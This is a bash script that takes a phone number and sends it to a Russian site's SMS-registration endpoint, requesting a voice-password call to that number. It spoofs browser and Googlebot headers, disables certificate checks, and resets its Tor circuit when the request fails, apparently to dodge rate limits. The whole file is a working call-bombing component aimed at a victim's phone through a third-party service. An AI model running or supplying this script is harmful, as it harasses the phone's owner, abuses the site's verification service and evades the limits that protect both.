#!/bin/bash

PHONE="$(echo "$1" | sed -E 's/\+//')"
echo "+$PHONE"


RESULT=$(curl -sk --retry 3 'https://87.236.16.226/index.php?route=module/sms_reg/SmsCheck' \
           -H 'Host: xn--80aikcmnyq9bye.xn--p1ai' \
           -H 'authority: xn--80aikcmnyq9bye.xn--p1ai' \
           -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"' \
           -H 'dnt: 1' \
           -H 'sec-ch-ua-mobile: ?0' \
           -H 'user-agent: +http://www.google.com/bot.html))' \
           -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
           -H 'accept: application/json, text/javascript, */*; q=0.01' \
           -H 'x-requested-with: XMLHttpRequest' \
           -H 'sec-ch-ua-platform: "Windows"' \
           -H 'origin: https://xn--80aikcmnyq9bye.xn--p1ai' \
           -H 'sec-fetch-site: same-origin' \
           -H 'sec-fetch-mode: cors' \
           -H 'sec-fetch-dest: empty' \
           -H 'referer: https://xn--80aikcmnyq9bye.xn--p1ai/' \
           -H 'accept-language: ru-UA,ru;q=0.9' \
           --data-raw "&phone=$PHONE&method=voice-password" \
           --compressed)

echo "$RESULT"

if [ "$(echo "$RESULT" | grep -c 'welcome_reg')" = "0" ]; then
  pkill -sighup tor 2>/dev/null
fi
